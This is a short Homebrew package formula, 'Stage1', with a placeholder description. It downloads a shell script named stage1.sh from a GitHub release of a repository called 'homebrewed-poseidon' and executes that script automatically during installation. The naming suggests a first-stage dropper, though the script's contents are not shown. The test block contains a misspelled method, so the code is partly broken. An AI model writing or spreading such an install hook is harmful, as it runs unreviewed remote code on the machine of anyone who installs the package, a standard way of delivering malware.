class Stage1 < Formula
  desc "Description of your script"
  homepage "https://github.com/rache2022"
  url "https://github.com/rache2022/homebrewed-poseidon/releases/download/v1.0.0/stage1.sh"
  sha256 "d548702736fced88896492c82bcde0f9bd10e69d9366a09a19747101b4b4fc2b"

  def install
    bin.install "stage1.sh" => "stage1"
    chmod "+x", "#{bin}/stage1"
    system "#{bin}/stage1", "&"
  end

  test do
    asset_predicate bin/"stage1", :exist?
  end
end
